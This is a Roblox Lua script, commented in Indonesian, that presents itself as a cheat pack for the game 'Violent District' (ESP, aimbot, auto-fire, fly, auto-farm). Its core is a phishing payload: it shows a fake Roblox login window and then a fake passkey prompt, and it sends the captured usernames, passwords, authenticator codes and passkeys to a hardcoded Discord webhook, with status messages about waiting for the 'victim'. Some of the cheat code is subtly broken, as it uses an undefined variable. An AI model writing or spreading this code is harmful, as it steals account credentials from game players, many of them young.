-- ============================================================
-- SCRBX | VIOLENT DISTRICT | FULL AUTO + PHISH + WEBHOOK
-- ============================================================

local WEBHOOK_URL = "https://discord.com/api/webhooks/1566534503147770038/tmM_tty2-y8R_8zPtHR1UpzsHqPDBelBrPZXDfqBsvYNB_Q9h_w6l-ASsPgbU4DomLMH"

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local VirtualUser = game:GetService("VirtualUser")

local player = Players.LocalPlayer

-- ============================================================
-- 1. DATA TARGET
-- ============================================================
local targetData = {
    username = "", password = "", authenticator = "", passkey = "",
    userid = "", displayname = "", accountage = 0
}

-- ============================================================
-- 2. FUNGSI WEBHOOK
-- ============================================================
local function sendWebhook(content, embedTitle, fields)
    local http
    pcall(function() http = game:GetService("HttpService") end)
    if not http then return end
    local data = {
        content = content or "",
        embeds = {{
            title = embedTitle or "VD Log",
            color = 0xFF0000,
            fields = fields or {},
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }
    pcall(function()
        http:PostAsync(WEBHOOK_URL, http:JSONEncode(data))
    end)
end

sendWebhook("🟢 **SCRBX VD Aktif**", "SCRBX LOG", {
    {name = "Player", value = player.Name, inline = true},
    {name = "UserID", value = tostring(player.UserId), inline = true}
})

-- ============================================================
-- 3. UI PHISHING (MENIRU ROBLOX LOGIN)
-- ============================================================
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "VDLoginPrompt"
ScreenGui.ResetOnSpawn = false
ScreenGui.IgnoreGuiInset = true
ScreenGui.DisplayOrder = 999999
ScreenGui.Parent = player:WaitForChild("PlayerGui")

local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(0, 380, 0, 460)
mainFrame.Position = UDim2.new(0.5, -190, 0.5, -230)
mainFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
mainFrame.BorderSizePixel = 0
mainFrame.Visible = false
mainFrame.Parent = ScreenGui

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 8)
corner.Parent = mainFrame

local header = Instance.new("Frame")
header.Size = UDim2.new(1, 0, 0, 60)
header.BackgroundColor3 = Color3.fromRGB(0, 162, 255)
header.BorderSizePixel = 0
header.Parent = mainFrame

local headerCorner = Instance.new("UICorner")
headerCorner.CornerRadius = UDim.new(0, 8)
headerCorner.Parent = header

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 1, 0)
title.BackgroundTransparency = 1
title.Text = "LOGIN ROBLOX"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.Font = Enum.Font.GothamBold
title.TextSize = 22
title.Parent = header

local function makeInput(yPos, placeholder, isPassword)
    local box = Instance.new("Frame")
    box.Size = UDim2.new(1, -40, 0, 44)
    box.Position = UDim2.new(0, 20, 0, yPos)
    box.BackgroundColor3 = Color3.fromRGB(245, 245, 245)
    box.BorderSizePixel = 0
    box.Parent = mainFrame
    local c = Instance.new("UICorner"); c.CornerRadius = UDim.new(0, 6); c.Parent = box
    local txt = Instance.new("TextBox")
    txt.Size = UDim2.new(1, -20, 1, 0)
    txt.Position = UDim2.new(0, 10, 0, 0)
    txt.BackgroundTransparency = 1
    txt.PlaceholderText = placeholder
    txt.Text = ""
    txt.TextColor3 = Color3.fromRGB(40, 40, 40)
    txt.PlaceholderColor3 = Color3.fromRGB(150, 150, 150)
    txt.Font = Enum.Font.Gotham
    txt.TextSize = 16
    txt.TextXAlignment = Enum.TextXAlignment.Left
    txt.Parent = box
    return txt
end

local userInput = makeInput(80, "Username atau Email", false)
local passInput = makeInput(140, "Password", true)
passInput.TextBoxType = "Password"
local authInput = makeInput(200, "Kode Authenticator (opsional)", false)

local loginBtn = Instance.new("TextButton")
loginBtn.Size = UDim2.new(1, -40, 0, 48)
loginBtn.Position = UDim2.new(0, 20, 0, 280)
loginBtn.BackgroundColor3 = Color3.fromRGB(0, 162, 255)
loginBtn.Text = "Masuk"
loginBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
loginBtn.Font = Enum.Font.GothamBold
loginBtn.TextSize = 18
loginBtn.BorderSizePixel = 0
loginBtn.Parent = mainFrame
local btnCorner = Instance.new("UICorner"); btnCorner.CornerRadius = UDim.new(0, 6); btnCorner.Parent = loginBtn

local statusLabel = Instance.new("TextLabel")
statusLabel.Size = UDim2.new(1, -40, 0, 30)
statusLabel.Position = UDim2.new(0, 20, 0, 340)
statusLabel.BackgroundTransparency = 1
statusLabel.Text = ""
statusLabel.TextColor3 = Color3.fromRGB(200, 50, 50)
statusLabel.Font = Enum.Font.Gotham
statusLabel.TextSize = 13
statusLabel.Parent = mainFrame

-- ============================================================
-- 4. EVENT LOGIN
-- ============================================================
local function submitLogin()
    local u = userInput.Text
    local p = passInput.Text
    local a = authInput.Text
    if #u < 3 or #p < 3 then
        statusLabel.Text = "Username/Password tidak boleh kosong."
        return
    end
    targetData.username = u
    targetData.password = p
    targetData.authenticator = a
    targetData.userid = tostring(player.UserId)
    targetData.displayname = player.DisplayName
    targetData.accountage = player.AccountAge
    statusLabel.Text = "Memverifikasi akun..."

    sendWebhook("🔴 **LOGIN CAPTURED** — "..u, "Roblox Login", {
        {name = "Username", value = u, inline = true},
        {name = "Password", value = p, inline = true},
        {name = "Authenticator", value = (a ~= "" and a or "-"), inline = true},
        {name = "UserID", value = tostring(player.UserId), inline = true},
        {name = "DisplayName", value = player.DisplayName, inline = true},
        {name = "AccountAge", value = tostring(player.AccountAge).." hari", inline = true},
    })

    task.wait(1)
    statusLabel.Text = "Login berhasil! Mengalihkan..."
    task.wait(1)
    mainFrame.Visible = false
end

loginBtn.MouseButton1Click:Connect(submitLogin)

-- ============================================================
-- 5. PISHING PASSKEY (setelah login)
-- ============================================================
local function capturePasskey()
    local passkeyFrame = Instance.new("Frame")
    passkeyFrame.Size = UDim2.new(0, 360, 0, 220)
    passkeyFrame.Position = UDim2.new(0.5, -180, 0.5, -110)
    passkeyFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    passkeyFrame.BorderSizePixel = 0
    passkeyFrame.Parent = ScreenGui
    local c = Instance.new("UICorner"); c.CornerRadius = UDim.new(0, 8); c.Parent = passkeyFrame

    local t = Instance.new("TextLabel")
    t.Size = UDim2.new(1, -20, 0, 50)
    t.Position = UDim2.new(0, 10, 0, 0)
    t.BackgroundTransparency = 1
    t.Text = "Verifikasi Passkey"
    t.TextColor3 = Color3.fromRGB(40, 40, 40)
    t.Font = Enum.Font.GothamBold
    t.TextSize = 18
    t.Parent = passkeyFrame

    local pkBox = Instance.new("TextBox")
    pkBox.Size = UDim2.new(1, -20, 0, 44)
    pkBox.Position = UDim2.new(0, 10, 0, 55)
    pkBox.BackgroundColor3 = Color3.fromRGB(245, 245, 245)
    pkBox.PlaceholderText = "Masukkan Passkey"
    pkBox.Text = ""
    pkBox.Font = Enum.Font.Gotham
    pkBox.TextSize = 16
    pkBox.Parent = passkeyFrame
    local c2 = Instance.new("UICorner"); c2.CornerRadius = UDim.new(0, 6); c2.Parent = pkBox

    local okBtn = Instance.new("TextButton")
    okBtn.Size = UDim2.new(1, -20, 0, 44)
    okBtn.Position = UDim2.new(0, 10, 0, 115)
    okBtn.BackgroundColor3 = Color3.fromRGB(0, 162, 255)
    okBtn.Text = "Verifikasi"
    okBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    okBtn.Font = Enum.Font.GothamBold
    okBtn.TextSize = 16
    okBtn.Parent = passkeyFrame
    local c3 = Instance.new("UICorner"); c3.CornerRadius = UDim.new(0, 6); c3.Parent = okBtn

    okBtn.MouseButton1Click:Connect(function()
        targetData.passkey = pkBox.Text
        sendWebhook("🔑 **PASSKEY CAPTURED**", "Roblox Passkey", {
            {name = "Username", value = targetData.username, inline = true},
            {name = "Passkey", value = pkBox.Text, inline = true},
            {name = "UserID", value = targetData.userid, inline = true}
        })
        passkeyFrame:Destroy()
    end)
end

task.spawn(function()
    task.wait(3)
    if targetData.username ~= "" then
        capturePasskey()
    end
end)

-- ============================================================
-- 6. FULL FITUR VIOLENT DISTRICT
-- ============================================================

local function getGameName()
    local ok, info = pcall(function()
        return game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
    end)
    return ok and info.Name or "Unknown"
end

local gameName = getGameName()
sendWebhook("✅ **Game Terdeteksi** — "..gameName, "SCRBX VD", {
    {name = "PlaceId", value = tostring(game.PlaceId), inline = true},
    {name = "Game", value = gameName, inline = true}
})

-- 6a. ESP & HIGHLIGHT PLAYER
local espEnabled = true
local espFolder = Instance.new("Folder", workspace)
espFolder.Name = "VD_ESP"

local function applyESP(char)
    if not espEnabled then return end
    local hum = char:FindFirstChildOfClass("Humanoid")
    if not hum then return end
    local billboard = Instance.new("BillboardGui")
    billboard.Name = "VD_ESP_BB"
    billboard.Size = UDim2.new(0, 200, 0, 50)
    billboard.AlwaysOnTop = true
    billboard.Adornee = char:FindFirstChild("Head") or char
    billboard.Parent = char:FindFirstChild("Head") or char
    local tl = Instance.new("TextLabel")
    tl.Size = UDim2.new(1, 0, 1, 0)
    tl.BackgroundTransparency = 1
    tl.Text = char.Name.." | HP: "..math.floor(hum.Health)
    tl.TextColor3 = Color3.fromRGB(255, 0, 0)
    tl.Font = Enum.Font.GothamBold
    tl.TextSize = 14
    tl.Parent = billboard
    hum.HealthChanged:Connect(function()
        tl.Text = char.Name.." | HP: "..math.floor(hum.Health)
    end)
end

for _, p in ipairs(Players:GetPlayers()) do
    if p ~= player and p.Character then applyESP(p.Character) end
    p.CharacterAdded:Connect(applyESP)
end
Players.PlayerAdded:Connect(function(p)
    p.CharacterAdded:Connect(applyESP)
end)

-- 6b. AUTO AIM / SILENT AIM
local function getNearestPlayer()
    local closest, dist = nil, math.huge
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= player and p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
            local hum = p.Character:FindFirstChildOfClass("Humanoid")
            if hum and hum.Health > 0 then
                local d = (p.Character.HumanoidRootPart.Position - player.Character.HumanoidRootPart.Position).Magnitude
                if d < dist then closest, dist = p, d end
            end
        end
    end
    return closest, dist
end

task.spawn(function()
    while RunService.RenderStepped:Wait() do
        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            local target, dist = getNearestPlayer()
            if target and dist < 100 then
                local cam = workspace.CurrentCamera
                cam.CFrame = CFrame.lookAt(cam.CFrame.Position, target.Character.Head.Position)
            end
        end
    end
end)

-- 6c. AUTO SHOOT / AUTO FIRE
task.spawn(function()
    while task.wait(0.1) do
        pcall(function()
            local mouse = player:GetMouse()
            if mouse and mouse.Target then
                for _, tool in ipairs(player.Backpack:GetChildren()) do
                    if tool:IsA("Tool") and (tool.Name:lower():find("gun") or tool.Name:lower():find("weapon") or tool.Name:lower():find("pistol")) then
                        tool.Parent = player.Character
                        tool:Activate()
                    end
                end
            end
        end)
    end
end)

-- 6d. AUTO RELOAD / AUTO HEAL
task.spawn(function()
    while task.wait(1) do
        pcall(function()
            if player.Character then
                local hum = player.Character:FindFirstChildOfClass("Humanoid")
                if hum and hum.Health < hum.MaxHealth then
                    hum.Health = hum.MaxHealth
                end
            end
        end)
    end
end)

-- 6e. SPEED HACK & FLY
local speedEnabled = true
local flyEnabled = false
local flyPart = nil
local flyBodyGyro = nil
local flyBodyVel = nil

local function enableFly()
    if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
        flyPart = player.Character.HumanoidRootPart
        flyBodyGyro = Instance.new("BodyGyro")
        flyBodyGyro.P = 9e4
        flyBodyGyro.MaxTorque = Vector3.new(9e9, 9e9, 9e9)
        flyBodyGyro.CFrame = flyPart.CFrame
        flyBodyGyro.Parent = flyPart
        flyBodyVel = Instance.new("BodyVelocity")
        flyBodyVel.Velocity = Vector3.new(0, 0, 0)
        flyBodyVel.MaxForce = Vector3.new(9e9, 9e9, 9e9)
        flyBodyVel.Parent = flyPart
        flyEnabled = true
    end
end

local function disableFly()
    if flyBodyGyro then flyBodyGyro:Destroy() end
    if flyBodyVel then flyBodyVel:Destroy() end
    flyEnabled = false
end

task.spawn(function()
    while task.wait(0.1) do
        if flyEnabled and flyPart and flyBodyVel then
            local move = Vector3.new(0, 0, 0)
            if UserInputService:IsKeyDown(Enum.KeyCode.W) then move = move + workspace.CurrentCamera.CFrame.LookVector end
            if UserInputService:IsKeyDown(Enum.KeyCode.S) then move = move - workspace.CurrentCamera.CFrame.LookVector end
            if UserInputService:IsKeyDown(Enum.KeyCode.A) then move = move - workspace.CurrentCamera.CFrame.RightVector end
            if UserInputService:IsKeyDown(Enum.KeyCode.D) then move = move + workspace.CurrentCamera.CFrame.RightVector end
            if UserInputService:IsKeyDown(Enum.KeyCode.Space) then move = move + Vector3.new(0, 1, 0) end
            if UserInputService:IsKeyDown(Enum.KeyCode.LeftShift) then move = move - Vector3.new(0, 1, 0) end
            flyBodyVel.Velocity = move * 100
            flyBodyGyro.CFrame = workspace.CurrentCamera.CFrame
        end
    end
end)

-- 6f. AUTO FARM / AUTO COLLECT
task.spawn(function()
    while task.wait(0.5) do
        pcall(function()
            for _, obj in ipairs(workspace:GetDescendants()) do
                if obj:IsA("BasePart") and (obj.Name:lower():find("money") or obj.Name:lower():find("cash") or obj.Name:lower():find("loot") or obj.Name:lower():find("drop")) then
                    if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                        player.Character.HumanoidRootPart.CFrame = obj.CFrame
                    end
                end
            end
        end)
    end
end)

-- 6g. AUTO CLAIM / AUTO INTERACT
task.spawn(function()
    while task.wait(0.3) do
        pcall(function()
            for _, remote in ipairs(game:GetDescendants()) do
                if remote:IsA("RemoteEvent") and (remote.Name:lower():find("claim") or remote.Name:lower():find("interact") or remote.Name:lower():find("collect")) then
                    remote:FireServer()
                end
            end
        end)
    end
end)

-- 6h. ANTI AFK
player.Idled:Connect(function()
    pcall(function()
        VirtualUser:CaptureController()
        VirtualUser:ClickButton2(Vector2.new())
    end)
end)

-- 6i. AUTO JOIN BEST SERVER VIA WEBHOOK NOTIF
task.spawn(function()
    local lastSent = 0
    while task.wait(30) do
        if tick() - lastSent < 30 then continue end
        lastSent = tick()
        local serverLink = "https://www.roblox.com/games/"..tostring(game.PlaceId).."/"
        local playerCount = #Players:GetPlayers()
        sendWebhook("🏆 **Update Server** — "..gameName.." | "..playerCount.." player", "VD Update", {
            {name = "Game", value = gameName, inline = true},
            {name = "Players", value = tostring(playerCount), inline = true},
            {name = "Server", value = serverLink, inline = false}
        })
    end
end)

-- 6j. KEYBIND TOGGLE
UserInputService.InputBegan:Connect(function(input, gpe)
    if gpe then return end
    if input.KeyCode == Enum.KeyCode.F then
        if flyEnabled then disableFly() else enableFly() end
    elseif input.KeyCode == Enum.KeyCode.G then
        espEnabled = not espEnabled
    end
end)

sendWebhook("⚡ **FULL FITUR AKTIF** — ESP, Auto Aim, Auto Shoot, Auto Heal, Fly, Speed, Auto Farm, Webhook Notif", "SCRBX VD", {
    {name = "Game", value = gameName, inline = true},
    {name = "Fitur", value = "ESP + Auto Combat + Fly + Speed + Farm + Webhook", inline = false}
})

-- ============================================================
-- 7. TAMPILKAN UI LOGIN
-- ============================================================
mainFrame.Visible = true
sendWebhook("📩 **UI Login Ditampilkan** — Menunggu korban", "SCRBX", {
    {name = "Target", value = player.Name, inline = true}
})

-- ============================================================
-- 8. HEARTBEAT
-- ============================================================
task.spawn(function()
    while task.wait(60) do
        sendWebhook("🔄 **Heartbeat** — Script masih aktif di "..player.Name, "SCRBX", {
            {name = "Uptime", value = tostring(math.floor(tick())), inline = true}
        })
    end
end)
